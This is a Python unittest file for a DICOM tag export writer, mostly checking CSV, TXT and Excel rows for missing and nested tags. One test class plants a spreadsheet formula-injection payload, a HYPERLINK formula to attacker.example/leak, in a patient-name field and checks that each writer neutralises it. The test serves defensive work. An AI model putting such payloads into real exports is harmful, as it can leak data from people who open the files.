"""Tests for DICOM tag export CSV/Excel writers (missing-tag rows)."""

import csv
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from pydicom.dataset import Dataset
from pydicom.sequence import Sequence
from pydicom.tag import Tag

from core.tag_export_writer import write_csv_files, write_excel_file, write_txt_files


class TestTagExportWriterMissingRows(unittest.TestCase):
    def test_csv_includes_empty_row_when_missing_and_flag_true(self) -> None:
        ds = Dataset()
        ds.PatientName = "Test^Patient"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))  # not on dataset
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [str(Tag(0x0010, 0x0010)), missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path,
                variation,
                studies,
                selected,
                [str(Tag(0x0010, 0x0010)), missing_tag],
                include_private=False,
                include_missing_selected_tags=True,
            )
            out_file = os.path.join(tmp, "out.csv")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        tags_exported = [r[1] for r in data_rows]
        self.assertIn(str(Tag(0x0010, 0x0010)), tags_exported)
        self.assertIn(missing_tag, tags_exported)
        kvp_row = next(r for r in data_rows if r[1] == missing_tag)
        self.assertEqual(kvp_row[3], "")

    def test_csv_skips_missing_when_flag_false(self) -> None:
        ds = Dataset()
        ds.PatientName = "A"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path,
                variation,
                studies,
                selected,
                [missing_tag],
                include_private=False,
                include_missing_selected_tags=False,
            )
            out_file = os.path.join(tmp, "out.csv")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        self.assertEqual(len(data_rows), 0)

    def test_txt_includes_empty_row_when_missing_and_flag_true(self) -> None:
        ds = Dataset()
        ds.PatientName = "Test^Patient"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        missing_tag = str(Tag("KVP"))
        variation = {
            "ser1": {
                "varying_tags": [],
                "constant_tags": [str(Tag(0x0010, 0x0010)), missing_tag],
            }
        }
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.txt")
            write_txt_files(
                path,
                variation,
                studies,
                selected,
                [str(Tag(0x0010, 0x0010)), missing_tag],
                include_private=False,
                include_missing_selected_tags=True,
            )
            out_file = os.path.join(tmp, "out.txt")
            with open(out_file, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f, delimiter="\t"))
        data_rows = [r for r in rows if len(r) >= 4 and r[0] == "All"]
        tags_exported = [r[1] for r in data_rows]
        self.assertIn(str(Tag(0x0010, 0x0010)), tags_exported)
        self.assertIn(missing_tag, tags_exported)
        kvp_row = next(r for r in data_rows if r[1] == missing_tag)
        self.assertEqual(kvp_row[3], "")


class TestTagExportFormulaNeutralization(unittest.TestCase):
    """Attacker-controlled tag text must not become a live spreadsheet formula."""

    PAYLOAD = '=HYPERLINK("https://attacker.example/leak","review")'

    def _build_inputs(self):
        ds = Dataset()
        ds.PatientName = self.PAYLOAD
        ds.SeriesDescription = "=evil-series"
        studies = {"st1": {"ser1": [ds]}}
        selected = {"st1": {"ser1": [0]}}
        patient_name_tag = str(Tag(0x0010, 0x0010))
        variation = {
            "ser1": {"varying_tags": [], "constant_tags": [patient_name_tag]}
        }
        return studies, selected, variation, patient_name_tag

    def test_csv_neutralizes_formula_value(self) -> None:
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.csv")
            write_csv_files(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            with open(path, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f))
        value_cell = next(r[3] for r in rows if len(r) >= 4 and r[0] == "All")
        self.assertEqual(value_cell, "'" + self.PAYLOAD)
        # Series header must not start with a formula trigger either.
        series_cell = next(r[0] for r in rows if r and r[0].startswith(("Series", "'Series")))
        self.assertFalse(series_cell[:1] in ("=", "+", "-", "@"))

    def test_txt_neutralizes_formula_value(self) -> None:
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.txt")
            write_txt_files(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            with open(path, newline="", encoding="utf-8") as f:
                rows = list(csv.reader(f, delimiter="\t"))
        value_cell = next(r[3] for r in rows if len(r) >= 4 and r[0] == "All")
        self.assertEqual(value_cell, "'" + self.PAYLOAD)

    def test_xlsx_neutralizes_formula_value(self) -> None:
        openpyxl = __import__("openpyxl")
        studies, selected, variation, patient_name_tag = self._build_inputs()
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "out.xlsx")
            write_excel_file(
                path, variation, studies, selected, [patient_name_tag],
                include_private=False, include_missing_selected_tags=True,
            )
            wb = openpyxl.load_workbook(path)
            ws = wb[wb.sheetnames[0]]
            value_cells = [
                c.value
                for col in ws.iter_cols()
                for c in col
                if isinstance(c.value, str) and self.PAYLOAD in c.value
            ]
        self.assertTrue(value_cells)
        for cell in value_cells:
            # Stored as inert text (apostrophe-prefixed), never a formula cell.
            self.assertTrue(cell.startswith("'="))


class TestTagExportRowParity(unittest.TestCase):
    """The shared row builder must preserve every backend's selected-tag contract."""

    @staticmethod
    def _build_inputs():
        patient_name_tag = str(Tag('PatientName'))
        image_type_tag = str(Tag('ImageType'))
        instance_number_tag = str(Tag('InstanceNumber'))
        missing_tag = str(Tag('KVP'))
        sequence_tag = str(Tag('SourceImageSequence'))
        nested_tag = f"{sequence_tag}[0].{Tag('ReferencedSOPInstanceUID')!s}"

        def dataset(instance_number: int, referenced_uid: str) -> Dataset:
            reference = Dataset()
            reference.ReferencedSOPInstanceUID = referenced_uid
            result = Dataset()
            result.SeriesNumber = 7
            result.SeriesDescription = 'Parity'
            result.PatientName = 'Constant^Patient'
            result.ImageType = ['ORIGINAL', 'PRIMARY']
            result.InstanceNumber = instance_number
            result.SourceImageSequence = Sequence([reference])
            return result

        studies = {'st1': {'ser1': [dataset(1, '1.2.3'), dataset(2, '1.2.3')]}}
        selected_series = {'st1': {'ser1': [0, 8, 1]}}
        selected_tags = [
            patient_name_tag,
            image_type_tag,
            nested_tag,
            missing_tag,
            instance_number_tag,
        ]
        variation = {
            'ser1': {
                'constant_tags': selected_tags[:-1],
                'varying_tags': [instance_number_tag],
            }
        }
        return studies, selected_series, selected_tags, variation, nested_tag

    def test_all_backends_preserve_mixed_selected_tag_rows(self) -> None:
        studies, selected_series, selected_tags, variation, nested_tag = self._build_inputs()
        patient_name_tag = str(Tag('PatientName'))
        image_type_tag = str(Tag('ImageType'))
        instance_number_tag = str(Tag('InstanceNumber'))
        missing_tag = str(Tag('KVP'))

        with tempfile.TemporaryDirectory() as tmp:
            formats = (
                ('csv', write_csv_files, ','),
                ('txt', write_txt_files, '\t'),
            )
            for extension, writer, delimiter in formats:
                with self.subTest(format=extension):
                    path = os.path.join(tmp, f'out.{extension}')
                    writer(
                        path,
                        variation,
                        studies,
                        selected_series,
                        selected_tags,
                        include_private=False,
                        include_missing_selected_tags=True,
                        include_sequences=True,
                    )
                    with open(path, newline='', encoding='utf-8') as exported:
                        rows = list(csv.reader(exported, delimiter=delimiter))
                    self._assert_mixed_data_rows(
                        rows,
                        patient_name_tag,
                        image_type_tag,
                        nested_tag,
                        missing_tag,
                        instance_number_tag,
                    )

            with self.subTest(format='xlsx'):
                path = os.path.join(tmp, 'out.xlsx')
                write_excel_file(
                    path,
                    variation,
                    studies,
                    selected_series,
                    selected_tags,
                    include_private=False,
                    include_missing_selected_tags=True,
                    include_sequences=True,
                )
                openpyxl = __import__('openpyxl')
                workbook = openpyxl.load_workbook(path)
                worksheet = workbook[workbook.sheetnames[0]]
                rows = [
                    ['' if value is None else str(value) for value in row]
                    for row in worksheet.iter_rows(max_col=4, values_only=True)
                ]
                self._assert_mixed_data_rows(
                    rows,
                    patient_name_tag,
                    image_type_tag,
                    nested_tag,
                    missing_tag,
                    instance_number_tag,
                )

    def _assert_mixed_data_rows(
        self,
        rows: list[list[str]],
        patient_name_tag: str,
        image_type_tag: str,
        nested_tag: str,
        missing_tag: str,
        instance_number_tag: str,
    ) -> None:
        data_rows = [row for row in rows if len(row) >= 4 and row[0] in ('All', 'Instance 1', 'Instance 2')]
        self.assertEqual(
            [(row[0], row[1], row[3]) for row in data_rows],
            [
                ('All', patient_name_tag, 'Constant^Patient'),
                ('All', image_type_tag, "['ORIGINAL', 'PRIMARY']"),
                ('All', nested_tag, '1.2.3'),
                ('All', missing_tag, ''),
                ('Instance 1', instance_number_tag, '1'),
                ('Instance 2', instance_number_tag, '2'),
            ],
        )


if __name__ == "__main__":
    unittest.main()
